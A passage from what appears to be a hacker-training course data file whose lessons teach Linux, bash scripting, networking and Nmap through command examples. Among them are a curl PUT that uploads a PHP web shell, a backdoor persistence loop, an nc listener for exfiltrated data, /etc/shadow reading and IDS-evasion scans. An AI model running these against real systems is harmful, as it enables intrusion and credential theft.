# Send a custom User-Agent to bypass simple blocks
curl -H "User-Agent: HSociety-Hacker-Trainee" http://<target_ip>
\`\`\`

**2. Secure Data Transfer (SCP & Rsync):**
\`\`\`bash
# Copy a file from your machine to the target via SSH
scp ./my_tool.py hacker@<target_ip>:/tmp/

# Sync an entire directory (Only copies changed files!)
rsync -avz ./recon_data/ hacker@<target_ip>:~/backup/
\`\`\`

**3. Interacting with Raw Sockets (Netcat):**
Netcat is the "Swiss Army Knife" of every HSociety Hacker.
\`\`\`bash
# Connect to a web server and manually send a GET request
echo -e "GET / HTTP/1.0\r\n\r\n" | nc -nv <target_ip> 80

# Create a simple listener to receive a file
nc -lvnp 4444 > exfiltrated_data.zip
\`\`\`

**4. Advanced Connectivity Testing:**
\`\`\`bash
# Trace the path to a target using TCP (Bypasses many firewalls)
sudo traceroute -T -p 80 <target_ip>

# Ping a target with a specific packet size (Check for MTU issues)
ping -s 1000 -c 4 <target_ip>
\`\`\`

**5. SSH Port Forwarding (The Pro Move):**
Hackers use SSH to 'tunnel' through firewalls.
\`\`\`bash
# Map a remote database (3306) to your local machine (9000)
ssh -L 9000:localhost:3306 hacker@<target_ip>

# Dynamic SOCKS proxy (Turn your browser into a hacker's tool)
ssh -D 1080 hacker@<target_ip>
\`\`\`

**6. Network Benchmarking & Stress:**
\`\`\`bash
# See how fast you can transfer data to the target
iperf3 -c <target_ip>
\`\`\`

*Experiment:* Use \`curl\` to visit \`http://<remote_server_ip>\`. If it fails, try adding \`-k\` to ignore SSL errors or \`-L\` to follow redirects. Every failure is a lesson in the HSociety program.`,
              image: 'step-03.webp',
            },
            {
              title: 'Mastering Persistence & Background Tasks',
              instruction:
                `A professional HSociety Hacker never waits for a slow scan to finish. You must learn to multi-task, leaving your tools running in the background while you move on to the next objective. Master the chaos, and you master the system.

**1. Backgrounding & Jobs:**
\`\`\`bash
# Start a long-running scan and immediately move it to the background
./hs_scanner.sh &

# List all your currently running background jobs
jobs -l

# Bring job #1 back to the foreground
fg %1
\`\`\`

**2. Surviving Terminal Closure:**
If your connection drops, your tools shouldn't stop.
\`\`\`bash
# Run a command that will keep going even if you log out
nohup ./long_recon.sh &

# Use 'disown' to remove a job from the shell's control
./tool.sh &
disown
\`\`\`

**3. The Power of Tmux (Terminal Multiplexing):**
Tmux is the preferred environment for every HSociety Hacker.
\`\`\`bash
# Start a new named session
tmux new -s hs_engagement

# List all active sessions
tmux ls

# Re-attach to a session after your connection was interrupted
tmux attach -t hs_engagement
\`\`\`

**4. Managing Unresponsive Tasks:**
\`\`\`bash
# Send the 'SIGTERM' (15) signal for a graceful exit
kill -15 1234

# Send the 'SIGKILL' (9) signal to force an immediate stop
kill -9 1234

# Kill all processes matching a specific name
pkill -f "hs_tool"
\`\`\`

**5. Scheduling Tasks (Crontab):**
Automate your persistence or recurring recon tasks.
\`\`\`bash
# List your current scheduled tasks
crontab -l

# Edit your tasks (e.g., run a script every midnight)
# 0 0 * * * /home/hacker/daily_recon.sh
crontab -e
\`\`\`

**6. Systemd: The Ultimate Persistence:**
Intermediate operators create 'services' to ensure their tools restart on reboot.
\`\`\`bash
# See all active system services
systemctl list-units --type=service

# Check the status of a specific service
systemctl status sshd
\`\`\`

*Hacker Tip:* Use \`Ctrl+Z\` to temporarily pause a running program, then type \`bg\` to keep it running in the background. You've just learned to multitask like a true HSociety Hacker.`,
              image: 'step-04.webp',
            },
          ],
        },
        {
          id: 'room4',
          title: 'Scripting Fundamentals',
          overview:
            "A hacker who cannot script is like a soldier who cannot aim. Automation is what separates the average user from the HSociety elite. In this room, you will learn to build your own custom tools, automating the boring tasks so you can focus on the critical breakthroughs. Train like a hacker, automate like a pro.",
          estimatedMinutes: 40,
          steps: [
            {
              title: 'Hacker Automation: The First Script',
              instruction:
                `Every HSociety toolkit started with a single script. Bash scripting allows you to chain commands together, creating a powerful multiplier for your efforts. As you become a hacker, you'll realize that consistency is key — and scripts provide exactly that.

**1. The Foundation (Shebang & Permissions):**
Every script must start with a 'Shebang' to tell Linux which interpreter to use.
\`\`\`bash
# Create the file
touch recon.sh

# The standard Shebang line
echo "#!/bin/bash" > recon.sh

# Make it executable (Essential HSociety step)
chmod +x recon.sh
\`\`\`

**2. Standard Streams & Redirection:**
Intermediate scripts handle data by redirecting output and errors.
\`\`\`bash
# Save output to a file, ignore errors
./my_tool.sh > output.log 2>/dev/null

# Append output to an existing file
echo "New Target: <target_ip>" >> targets.txt

# Pipe one script's output into another
./get_ips.sh | ./scan_ips.sh
\`\`\`

**3. Using Comments & Echo for Clarity:**
Professional scripts are well-documented so your team can use them.
\`\`\`bash
#!/bin/bash
# HSociety Recon Script v1.0
# Author: Trainee-Hacker

echo "[*] Starting HSociety System Report..."
echo "------------------------------------"
\`\`\`

**4. Capturing Command Output:**
Use 'Command Substitution' to store results in variables.
\`\`\`bash
# Capture the current kernel version
KERNEL=$(uname -r)
echo "Target Kernel: $KERNEL"

# Capture the current user's UID
MY_UID=$(id -u)
echo "Operating as UID: $MY_UID"
\`\`\`

**5. Shell Safety & Error Handling:**
\`\`\`bash
# Exit the script immediately if any command fails
set -e

# Treat unset variables as an error
set -u

# Print commands before executing them (Great for debugging)
set -x
\`\`\`

**6. Basic Functions (Intermediate):**
\`\`\`bash
# Define a reusable function for logging
log_action() {
    echo "[$(date +%T)] $1"
}

# Call the function
log_action "Scanning target: <target_ip>"
\`\`\`

*Self-Check:* Create a script that prints "Training to be an HSociety Hacker" and saves it to a file named \`goal.txt\`. Use the commands you've learned to make it executable and run it.`,
              image: 'step-01.webp',
            },
            {
              title: 'Variables & Intelligent Tooling',
              instruction:
                `To become a hacker, your tools must be smart. By using variables and user input, you can create scripts that adapt to any environment. In the field, we don't hardcode targets; we build flexible instruments of discovery.

**1. Variable Manipulation:**
\`\`\`bash
# Store the target IP
TARGET_IP="<target_ip>"

# Use the variable in a command
ping -c 1 $TARGET_IP

# Read input from the user during execution
echo -n "Enter HSociety Access Code: "
read -s CODE  # -s hides the input (perfect for passwords!)
\`\`\`

**2. Script Arguments (CLI Power):**
Pass data to your script when you start it.
\`\`\`bash
# $1 is the first argument, $2 is the second
echo "Target: $1"
echo "Port: $2"

# Check if an argument was provided
if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi
\`\`\`

**3. Environment & Default Values:**
\`\`\`bash
# Use a default value if the variable is empty
TARGET="$\{1:-<target_ip>}"
echo "Scanning $TARGET"

# Access environment variables from within your script
echo "Home directory: $HOME"
\`\`\`

**4. Reading from Files (Massive Scaling):**
\`\`\`bash
# Read a target list line by line
while read -r TARGET; do
    echo "[*] Testing $TARGET..."
done < targets.txt
\`\`\`

**5. Arithmetic & Counting:**
\`\`\`bash
# Simple addition in bash
PORT_COUNT=0
PORT_COUNT=$((PORT_COUNT + 1))

# Complex calculations using 'bc'
echo "scale=2; 100 / 3" | bc
\`\`\`

**6. String Slicing & Modification:**
\`\`\`bash
# Extract the first 3 characters of a string
HANDLE="HackerTrainee"
echo "Prefix: $\{HANDLE:0:3}"

# Replace text within a variable
STAGED_PATH="/tmp/hs_tool"
echo "New Path: $\{STAGED_PATH/tmp/dev/shm}"
\`\`\`

*Training Task:* Write a script that takes a username as an argument and checks if they exist in \`/etc/passwd\`. If they do, print "Target found in HSociety database."`,
              image: 'step-02.webp',
            },
            {
              title: 'Loops: The Multiplier of Effort',
              instruction:
                `Loops are the engine of automation. Why scan one IP when you can scan a thousand? As an HSociety Hacker, you will use loops to perform mass enumeration, brute-forcing, and data harvesting across entire networks.

**1. The 'For' Loop Mastery:**
\`\`\`bash
# Loop through a known list of HSociety servers
for HOST in <target_ip_1> <target_ip_2> <api_internal>; do
    echo "Pinging $HOST..."
    nc -zv $HOST 80 2>&1 | grep "open"
done

# Loop through a numeric range (1 to 254)
for i in {1..254}; do
    echo "<target_prefix>.$i" >> subnet_map.txt
done
\`\`\`

**2. The 'While' Loop (Continuous Monitoring):**
\`\`\`bash
# Monitor for a specific file to appear (Persistence check)
while [ ! -f /tmp/hacker_ready ]; do
    echo "Waiting for signal..."
    sleep 5
done
\`\`\`

**3. Processing Command Output in Loops:**
\`\`\`bash
# Loop through every .log file in /var/log
for LOG in $(ls /var/log/*.log); do
    echo "Searching $LOG for 'password'..."
    grep -i "password" "$LOG" 2>/dev/null
done
\`\`\`

**4. Nested Loops (Grid Scanning):**
\`\`\`bash
# Scan a grid of IPs and Ports
for IP in <target_prefix>.{1..5}; do
    for PORT in 22 80 443; do
        echo "Testing $IP:$PORT"
    done
done
\`\`\`

**5. Loop Control (Break & Continue):**
\`\`\`bash
# Stop a loop early if we find what we need
for PASS in $(cat wordlist.txt); do
    if [ "$PASS" == "hsociety123" ]; then
        echo "[!] Found the secret key!"
        break
    fi
done
\`\`\`

**6. Infinite Loops for Persistence:**
\`\`\`bash
# Run a tool forever (restarts if it crashes)
while true; do
    ./hs_backdoor.sh
    sleep 60
done
\`\`\`

*Challenge:* Create a loop that prints the numbers 10 down to 1, followed by "LIFTOFF - You are now an HSociety Hacker!"`,
              image: 'step-03.webp',
            },
            {
              title: 'Conditionals & The Logic of Discovery',
              instruction:
                `Intelligence is the ability to make choices. Conditionals allow your scripts to react to the system's defenses. To become a hacker is to understand the logic of the target, finding the 'If' that leads to root.

**1. The 'If/Then' Architecture:**
\`\`\`bash
# Check if you are running as root
if [ $(id -u) -eq 0 ]; then
    echo "[!] WARNING: Running with full HSociety privileges!"
else
    echo "[*] Standard trainee access."
fi
\`\`\`

**2. Logical Operators (AND / OR):**
\`\`\`bash
# Check if two conditions are true
if [ -f "/etc/shadow" ] && [ -r "/etc/shadow" ]; then
    echo "[+] The vault is open! Reading hashes..."
fi

# Use || (OR) for fallback options
ping -c 1 $TARGET || echo "[-] Target is unreachable!"
\`\`\`

**3. Case Statements (Clean Multi-Choice):**
\`\`\`bash
# Handle multiple different scan types
case "$1" in
    "fast") nmap -F "$TARGET" ;;
    "deep") nmap -p- -A "$TARGET" ;;
    "stealth") nmap -sS -T2 "$TARGET" ;;
    *) echo "Usage: $0 {fast|deep|stealth}" ;;
esac
\`\`\`

**4. Advanced File Checks:**
\`\`\`bash
# Is it a directory? Is it writable? Is it newer than our last report?
if [ -d "/tmp/hs_recon" ] && [ -w "/tmp/hs_recon" ]; then
    cp report.txt /tmp/hs_recon/
fi
\`\`\`

**5. Handling Command Success/Failure:**
\`\`\`bash
# The 'Exit Code' ($?) tells you if the last command worked
grep "root" /etc/passwd > /dev/null
if [ $? -eq 0 ]; then
    echo "Root account confirmed."
fi
\`\`\`

**6. Combining Logic into a 'Smart Scanner':**
\`\`\`bash
#!/bin/bash
# HSociety Smart Port Checker
TARGET="$\{1:-localhost}"
PORT="$\{2:-80}"

if nc -zw1 "$TARGET" "$PORT" 2>/dev/null; then
    echo "[!] Port $PORT is OPEN on $TARGET"
    # If open, try to grab the banner
    timeout 2 nc -nv "$TARGET" "$PORT" | head -n 1
else
    echo "[-] Port $PORT is closed."
fi
\`\`\`

*Final Training Project:* Combine everything you've learned into a single script. It should take an IP as an argument, check if it's alive, scan 3 common ports, and save the results to a file named \`recon_report.txt\`. You are now ready to graduate from Linux Foundations.`,
              image: 'step-04.webp',
            },
          ],
        },
      ],
    },

    // ── PHASE 3: NETWORKING (moduleId: 3, 5 rooms) ──────────────────────────
    {
      id: 'phase3',
      title: 'Networking',
      codename: 'PHASE 3',
      color: PHASE_COLORS.phase3,
      rooms: [
        {
          id: 'room1',
          title: 'TCP/IP & OSI Model',
          overview:
            "Every attack and defense in the HSociety arsenal starts with a fundamental truth: data must move. To become an elite operative, you must look past the screen and see the raw streams of bits traveling through the OSI layers. This room builds the theoretical framework you need to map digital terrain and identify the protocols that underpin everything you will compromise.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'The OSI Model: A Hacker\'s Map',
              instruction:
                `The OSI (Open Systems Interconnection) model is the conceptual map of the digital battlefield. As an HSociety Hacker, you don't just 'hack a website'; you target a specific layer of the stack.

**The 7 Layers of Engagement:**

1.  **Layer 7 — Application:** Where the human meets the machine.
    *   *Protocols:* HTTP, DNS, SSH, FTP, SMTP.
    *   *HSociety Focus:* SQL Injection, XSS, API manipulation.
2.  **Layer 6 — Presentation:** The translator. Manages encryption and formatting.
    *   *Protocols:* SSL/TLS, JPEG, GIF.
    *   *HSociety Focus:* Downgrade attacks, certificate spoofing.
3.  **Layer 5 — Session:** The coordinator. Manages connections.
    *   *Protocols:* RPC, NetBIOS, Sockets.
    *   *HSociety Focus:* Session hijacking, token theft.
4.  **Layer 4 — Transport:** The logistics. Manages delivery.
    *   *Protocols:* TCP (Reliable), UDP (Fast).
    *   *HSociety Focus:* Port scanning, SYN flooding.
5.  **Layer 3 — Network:** The navigator. Manages routing.
    *   *Protocols:* IP, ICMP, IPsec.
    *   *HSociety Focus:* IP spoofing, ICMP redirect.
6.  **Layer 2 — Data Link:** The neighborhood. Manages local hardware.
    *   *Protocols:* Ethernet, Wi-Fi (802.11).
    *   *HSociety Focus:* ARP poisoning, MAC flooding.
7.  **Layer 1 — Physical:** The terrain. The cables and radio waves.
    *   *HSociety Focus:* RF Jamming, hardware implants.

**Command Line Reconnaissance:**
\`\`\`bash
# Check your local routing table (Layer 3)
ip route show

# See the ARP cache (Layer 2 mapping of IPs to MAC addresses)
ip neighbor show

# Identify your network interface and its capabilities
ethtool eth0
\`\`\`

**Deep Dive:**
\`\`\`bash
# See which protocols are currently active on your machine
cat /etc/protocols | head -n 20

# Identify the MTU (Maximum Transmission Unit) for your packets
ip link show eth0 | grep mtu
\`\`\`

*Operative Memory Aid:* **"Please Do Not Throw Sausage Pizza Away"** (Physical to Application). Train your mind to identify which layer a tool is operating on before you run it.`,
              image: 'step-01.webp',
            },
            {
              title: 'The TCP Three-Way Handshake',
              instruction:
                `TCP (Transmission Control Protocol) is the "connection-oriented" standard. Before an HSociety operative can extract data, they must understand the 'handshake'—the formal greeting between two systems.

**The Sequence of Trust:**
1.  **SYN (Synchronize):** "Hello, I want to talk."
2.  **SYN-ACK (Sync-Acknowledge):** "I hear you, let's talk."
3.  **ACK (Acknowledge):** "Great, let's begin."

**Scanning with Precision:**
\`\`\`bash
# SYN Stealth Scan (-sS): Half-open scan. Fast and less detectable.
sudo nmap -sS -T4 <target_ip>

# Connect Scan (-sT): Completes the full handshake. Use when you lack root.
nmap -sT <target_ip>

# ACK Scan (-sA): Map out firewall rules (Check if ports are filtered)
sudo nmap -sA <target_ip>
\`\`\`

**Advanced Packet Manipulation:**
\`\`\`bash
# Xmas Scan (-sX): Sets FIN, PSH, and URG flags (Lights up like a Christmas tree)
sudo nmap -sX <target_ip>

# Null Scan (-sN): Sends a packet with NO flags set. Confuses older systems.
sudo nmap -sN <target_ip>

# Idle Scan (-sI): Uses a 'Zombie' host to hide your IP completely.
# sudo nmap -sI <zombie_ip> <target_ip>
\`\`\`

**Watching the Handshake:**
\`\`\`bash
# Monitor raw TCP flags in real-time (Watch the SYN/ACK dance)
sudo tcpdump -i any 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'

# Identify the sequence numbers used to establish state
sudo tcpdump -ni any -vvv port 80
\`\`\`

*Hacker's Note:* The \`RST\` (Reset) flag is the "Hang up" signal. If you receive a \`RST\` immediately after a \`SYN\`, the port is closed. If you receive a \`SYN-ACK\`, the door is open.`,
              image: 'step-02.webp',
            },
            {
              title: 'TCP vs UDP: Reliability vs Speed',
              instruction:
                `In the HSociety training program, you must choose the right tool for the job. TCP is a certified letter (guaranteed delivery); UDP is a postcard (shout it out and hope they hear).

**Common Service Ports:**
*   **TCP:** 22 (SSH), 80 (HTTP), 443 (HTTPS), 445 (SMB), 3389 (RDP).
*   **UDP:** 53 (DNS), 67/68 (DHCP), 123 (NTP), 161 (SNMP).

**Interrogating UDP Services:**
UDP doesn't use a handshake, making it harder to scan accurately.
\`\`\`bash
# Standard UDP scan (Slow, as it waits for timeouts)
sudo nmap -sU <target_ip>

# Scan the top 100 most common UDP ports
sudo nmap -sU --top-ports 100 <target_ip>

# Use version detection on UDP ports (-sV)
sudo nmap -sU -sV -p 53,161 <target_ip>
\`\`\`

**Advanced UDP Recon:**
\`\`\`bash
# Query SNMP community strings (The 'keys' to network devices)
onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt <target_ip>

# Enumerate detailed system info via SNMP
snmp-check <target_ip>

# Test if a UDP port is responsive with netcat
nc -zvu <target_ip> 53
\`\`\`

**Protocol Analysis:**
\`\`\`bash
# See which UDP sockets are currently open on your system
ss -ulnp

# Monitor UDP traffic for a specific service (e.g., DNS)
sudo tcpdump -i any udp port 53
\`\`\`

*Operative Insight:* Attackers target UDP because it is often overlooked by firewalls and rarely requires complex authentication. If a server is 'quiet' on TCP, check the UDP side.`,
              image: 'step-03.webp',
            },
            {
              title: 'Packet Analysis with tcpdump',
              instruction:
                `The terminal is your primary interface, and \`tcpdump\` is your microscope. To train like a hacker is to be able to read the raw heartbeat of the network without a GUI.

**Essential Filtering Mastery:**
\`\`\`bash
# Capture traffic on a specific interface (eth0)
sudo tcpdump -i eth0

# Capture only traffic coming FROM a specific target
sudo tcpdump src <target_ip>

# Capture traffic on a specific port (HTTP)
sudo tcpdump port 80
\`\`\`

**Advanced Data Extraction:**
\`\`\`bash
# Show packet contents in Hex and ASCII (X-Ray vision)
sudo tcpdump -nvvv -X -s 0 host <target_ip>

# Save traffic to a .pcap file for later analysis in Wireshark
sudo tcpdump -i any -w evidence.pcap

# Read an existing .pcap file through the terminal
tcpdump -r evidence.pcap
\`\`\`

**Operative Drills:**
\`\`\`bash
# Filter for ONLY SYN packets (Spot incoming port scans)
sudo tcpdump 'tcp[tcpflags] & (tcp-syn) != 0'

# Identify the 'User-Agent' in a web request using grep on tcpdump
sudo tcpdump -A -s 0 'tcp port 80' | grep -i "User-Agent"

# Monitor for 'Cleartext' passwords over FTP or Telnet
sudo tcpdump -A -ni any 'tcp port 21'
\`\`\`

**Performance & Stealth:**
\`\`\`bash
# Run in 'Quiet' mode to see only the basics
sudo tcpdump -q

# Don't resolve hostnames (Speeds up the capture)
sudo tcpdump -n
\`\`\`

*Challenge:* Start \`tcpdump\` in one terminal window. In another, run an \`nmap\` scan against \`localhost\`. Can you identify the exact moment the scan hits your machine? What flags do you see?`,
              image: 'step-04.webp',
            },
          ],
        },
        {
          id: 'room2',
          title: 'DNS, HTTP & Common Protocols',
          overview:
            "The web isn't just a collection of pages; it's a massive, interconnected network of protocols that were never built for security. In this room, you will learn to exploit the 'phonebook' of the internet (DNS) and the 'backbone' of the web (HTTP), uncovering the hidden paths and misconfigurations that lead to total system compromise.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'DNS: The Internet\'s Phonebook',
              instruction:
                `DNS (Domain Name System) is a goldmine for an HSociety operative. It translates human names into IP addresses, but it often reveals much more about a target's internal infrastructure than intended.

**Standard Query Drills:**
\`\`\`bash
# Query the 'A' record (IPv4 address)
dig <target_domain>

# Query the 'MX' records (Identify mail servers)
dig <target_domain> MX

# Query 'TXT' records (Often contains security policies like SPF/DKIM)
dig <target_domain> TXT
\`\`\`

**Advanced Enumeration:**
\`\`\`bash
# Use a specific DNS server for your query (e.g., the target's NS)
dig @<nameserver_ip> <target_domain>

# Reverse DNS lookup (Map an IP back to a name)
dig -x <target_ip>

# List ALL common record types at once
dig <target_domain> ANY
\`\`\`

**The Holy Grail: Zone Transfers (AXFR):**
A successful Zone Transfer gives you a complete list of EVERY subdomain.
\`\`\`bash
# Attempt a Zone Transfer against the target's name server
dig axfr @<nameserver_ip> <target_domain>

# Use 'host' as an alternative way to attempt AXFR
host -l <target_ip> <nameserver_ip>
\`\`\`

**Automation & Brute Force:**
\`\`\`bash
# Brute force subdomains using a wordlist and a simple loop
for sub in $(cat subdomains.txt); do host $sub.<target_domain>; done

# Use 'nslookup' for interactive queries
nslookup
> set type=mx
> <target_domain>
\`\`\`

**Security Analysis:**
\`\`\`bash
# Check the 'SOA' (Start of Authority) for timing information
dig <target_domain> SOA

# Identify the 'TTL' (Time to Live) to see how long records are cached
dig <target_domain> +noall +answer
\`\`\`

*Operative Insight:* A misconfigured DNS server is like leaving your internal network map on a park bench. Always check for AXFR vulnerabilities first.`,
              image: 'step-01.webp',
            },
            {
              title: 'HTTP: The Backbone of the Web',
              instruction:
                `To train like a hacker is to speak HTTP fluently. Every web attack starts with a request and ends with a response. You must learn to read the headers, understand the methods, and manipulate the state.

**Mastering Curl (The Operative's Tool):**
\`\`\`bash
# Fetch the content of a target page
curl http://<target_ip>

# See the full request and response headers (-v for Verbose)
curl -v http://<target_ip>

# Fetch ONLY the response headers (Fingerprinting)
curl -I http://<target_ip>
\`\`\`

**Advanced Request Manipulation:**
\`\`\`bash
# Spoof your 'User-Agent' to look like a mobile device or a crawler
curl -H "User-Agent: Googlebot/2.1" http://<target_ip>

# Follow redirects (-L) and ignore SSL errors (-k)
curl -Lk http://<target_ip>

# Send custom cookies to test for session vulnerabilities
curl -b "session=hacker_token; user=admin" http://<target_ip>/dashboard
\`\`\`

**HTTP Methods & Their Abuse:**
\`\`\`bash
# Check which methods are allowed on a target (OPTIONS)
curl -X OPTIONS http://<target_ip> -v

# Attempt to upload a file via the dangerous PUT method
curl -X PUT -d "<?php system($_GET['cmd']); ?>" http://<target_ip>/shell.php

# Send data via POST (Common for login forms)
curl -d "user=admin&pass=admin123" -X POST http://<target_ip>/login
\`\`\`

**Data Extraction & API Testing:**
\`\`\`bash
# Send a JSON payload to an API endpoint
curl -X POST -H "Content-Type: application/json" -d '{"id": 1}' http://<target_ip>/api

# Save a downloaded file with a specific name
curl -o local_tool.sh http://<target_ip>/tools/remote_tool.sh
\`\`\`

**Header Analysis:**
\`\`\`bash
# Check for 'Security Headers' (or their absence)
curl -s -I http://<target_ip> | grep -E "Strict-Transport|Content-Security|X-Frame"
\`\`\`

*Hacker's Strategy:* The \`X-Powered-By\` and \`Server\` headers are your best friends. They tell you exactly what software to research for known exploits.`,
              image: 'step-02.webp',
            },
            {
              title: 'Common Protocols: FTP, SSH & SMTP',
              instruction:
                `The web is only one part of the surface. HSociety operatives must also master the 'management' protocols that keep servers running. These are often the first place an attacker looks for weak credentials.

**SSH (Secure Shell):**
\`\`\`bash
# Connect to a target via SSH
ssh hacker@<target_ip>

# Execute a command remotely without opening a full shell
ssh hacker@<target_ip> "ls -la /var/www"

# Check the SSH server's version (Banner Grabbing)
nc -vn <target_ip> 22
\`\`\`

**FTP (File Transfer Protocol):**
\`\`\`bash
# Attempt an 'Anonymous' login (Username: anonymous, Password: <any>)
ftp <target_ip>

# List all files recursively on an FTP server
nmap --script ftp-anon,ftp-libwrap,ftp-proftpd-backdoor -p 21 <target_ip>
\`\`\`

**SMTP (Simple Mail Transfer Protocol):**
\`\`\`bash
# Interact with a mail server to verify users (VRFY)
nc -vn <target_ip> 25
HELO <target_ip>
VRFY admin
VRFY root
\`\`\`

**Automated Enumeration:**
\`\`\`bash
# Use nmap scripts to audit these protocols
sudo nmap -sV -sC -p 21,22,25 <target_ip>

# Brute force SSH with a common password list (Use with caution)
# hydra -l root -P passwords.txt ssh://<target_ip>
\`\`\`

**Network Service Discovery:**
\`\`\`bash
# See which local services are running and accessible
sudo ss -tulnp

# Monitor for traffic on these management ports
sudo tcpdump -i any port 21 or port 22 or port 25
\`\`\`

*Training Task:* Use \`nc\` to connect to port 22 on your local machine. Can you identify the SSH version? Research the most famous vulnerability for that version.`,
              image: 'step-03.webp',
            },
            {
              title: 'Protocol Analysis & Workflow',
              instruction:
                `To become an HSociety Hacker, you must move beyond running tools and start thinking in workflows. A professional engagement isn't a single command; it's a sequence of observations and reactions.

**The Recon Pipeline:**
\`\`\`bash
# 1. Identify the target's IP from its domain
TARGET_IP=$(dig +short <target_ip>)

# 2. Map the open ports (TCP)
sudo nmap -sS -p- --min-rate 5000 $TARGET_IP -oN scan.txt

# 3. Targeted version detection on open ports
# Replace $PORTS with the ports found in step 2
sudo nmap -sV -sC -p 22,80,443 $TARGET_IP
\`\`\`

**Advanced Banner Grabbing:**
\`\`\`bash
# Use a loop to grab banners from multiple ports
for port in 21 22 25 80; do (echo > /dev/tcp/<target_ip>/$port) >/dev/null 2>&1 && echo "$port is open"; done

# Use 'whatweb' to identify the technologies behind a website
whatweb http://<target_ip>
\`\`\`

**Traffic Interception Drills:**
\`\`\`bash
# Capture and display only the HTTP 'Host' headers in a PCAP
tshark -r capture.pcap -Y http -T fields -e http.host | sort -u

# Extract FTP usernames from a network capture
tshark -r capture.pcap -Y "ftp.request.command == USER" -T fields -e ftp.request.arg
\`\`\`

**Practical Drill:**
\`\`\`bash
# Use 'telnet' to manually talk to an HTTP server (Rarely used, but great for learning)
telnet <target_ip> 80
GET / HTTP/1.0
Host: <target_ip>
(Press Enter twice)
\`\`\`

**Clean Data Extraction:**
\`\`\`bash
# Extract only the IP addresses from an nmap scan output
grep -oE "\b([0-9]{1,3}\\.){3}[0-9]{1,3}\b" scan.txt | sort -u
\`\`\`

*Final Insight:* Networking isn't about memorizing ports; it's about understanding the "conversation" between machines. If you can hear the conversation, you can join it. If you can join it, you can control it.`,
              image: 'step-04.webp',
            },
          ],
        },
        {
          id: 'room3',
          title: 'Network Scanning & Enumeration',
          overview:
            "Enumeration is the most critical phase of any engagement. If you don't find it, you can't hack it. In this room, you will master Nmap from first principles, learning to bypass filters and map complex networks like a professional HSociety operative.",
          estimatedMinutes: 40,
          steps: [
            {
              title: 'Nmap Mastery: The Operative\'s Pulse',
              instruction:
                `Nmap (Network Mapper) is more than a scanner; it's a protocol analyzer and service investigator. To train like a hacker is to understand exactly what each flag does to the wire and how the target reacts.

**Core Scan Archetypes:**
\`\`\`bash
# The Default 'Stealth' Scan (SYN Scan)
sudo nmap -sS -T4 <target_ip>

# Connect Scan (TCP Handshake) - No root required
nmap -sT -T4 <target_ip>

# UDP Scan (Essential for finding hidden services)
sudo nmap -sU <target_ip>
\`\`\`

**Timing & Performance Optimization:**
\`\`\`bash
# 'Paranoid' scan to evade older IDS/IPS (-T0)
sudo nmap -sS -T0 <target_ip>

# 'Aggressive' scan for fast results on stable networks (-T4)
sudo nmap -sS -T4 <target_ip>

# Scan all 65,535 ports with high speed
sudo nmap -p- --min-rate 10000 <target_ip>
\`\`\`

**Evading Firewalls & IDS:**
\`\`\`bash
# Fragment packets to bypass simple packet filters
sudo nmap -f <target_ip>

# Use a specific source port (e.g., 53 or 80) to bypass rules
sudo nmap --source-port 53 <target_ip>

# Add random data (Padding) to packets to change their signature
sudo nmap --data-length 25 <target_ip>
\`\`\`

**OS & Service Fingerprinting:**
\`\`\`bash
# Attempt to identify the Operating System
sudo nmap -O <target_ip>

# Intense service version detection
sudo nmap -sV --version-intensity 9 <target_ip>

# The 'Aggressive' all-in-one flag (-A)
# (Equivalent to -sV -O -sC --traceroute)
sudo nmap -A <target_ip>
\`\`\`

**Packet-Level Observation:**
\`\`\`bash
# See exactly what Nmap is sending and receiving in real-time
sudo nmap -sS -p 80 --packet-trace <target_ip>

# Show why Nmap thinks a port is in a certain state
sudo nmap -sS -p 80 --reason <target_ip>
\`\`\`

**Output Management for Reporting:**
\`\`\`bash
# Save output in 'Greppable' format for easy parsing
nmap -sS <target_ip> -oG scan_results.txt

# Save in XML for importing into tools like Metasploit
nmap -sS <target_ip> -oX scan_results.xml

# Use 'Aleeet' format for a classic hacker look (-oN)
nmap -sS <target_ip> -oS -
\`\`\`

*Operative Drill:* Perform an \`-sS\` scan and an \`-sT\` scan while running \`tcpdump\`. Which one completes the handshake? Which one sends a \`RST\`?`,
              image: 'step-01.webp',
            },
            {
              title: 'Interrogating Services & Versions',
              instruction:
                `Knowing a port is 'open' is only 10% of the job. To become a hacker, you must identify exactly what is running behind that port, its version, and its potential weaknesses.

**Advanced Version Discovery:**
\`\`\`bash
# Version detection with specific port targeting
sudo nmap -sV -p 22,80,443,445 <target_ip>

# Guess the OS if detection isn't 100% sure
sudo nmap -O --osscan-guess <target_ip>
\`\`\`

**Identifying Web Technologies:**
\`\`\`bash
# Grab the HTTP title and server headers
nmap -p 80 --script http-title,http-headers <target_ip>

# Enumerate common directories and files
nmap -p 80 --script http-enum <target_ip>
\`\`\`

**Vulnerability Research Workflow:**
Once you have a version (e.g., Apache 2.4.41), search for exploits immediately.
\`\`\`bash
# Search for exploits in the local database
searchsploit "Apache 2.4.41"

# Search specifically for remote exploits
searchsploit "Apache 2.4.41" | grep -i "remote"
\`\`\`

**Interrogating SMB (Windows Sharing):**
\`\`\`bash
# Identify the OS and computer name via SMB
nmap -p 445 --script smb-os-discovery <target_ip>

# List shared folders (Requires guest or valid credentials)
nmap -p 445 --script smb-enum-shares <target_ip>
\`\`\`

**Interrogating Databases:**
\`\`\`bash
# Check if MySQL allows anonymous login
nmap -p 3306 --script mysql-empty-password <target_ip>

# Get the MySQL version and configuration info
nmap -p 3306 --script mysql-info <target_ip>
\`\`\`

**Banners & Raw Interaction:**
\`\`\`bash
# Manually grab a banner using netcat
nc -vn <target_ip> 80
HEAD / HTTP/1.0
(Enter)

# Use 'telnet' for services that expect raw text
telnet <target_ip> 25
\`\`\`

*Hacker's Strategy:* If Nmap reports a port as 'Filtered,' it means a firewall is dropping the packets. Try changing your source port to 53 or 88 — firewalls often trust traffic from DNS or Kerberos ports.`,
              image: 'step-02.webp',
            },
            {
              title: 'The Nmap Scripting Engine (NSE)',
              instruction:
                `The NSE is what transforms Nmap into a world-class vulnerability scanner. As an HSociety operative, you must master these scripts to automate the discovery of misconfigurations and exploitable flaws.

**Using Script Categories:**
\`\`\`bash
# Run all 'Default' and 'Safe' scripts
nmap -sC <target_ip>

# Scan for common vulnerabilities (Very noisy!)
nmap --script vuln <target_ip>

# Discover network information without being intrusive
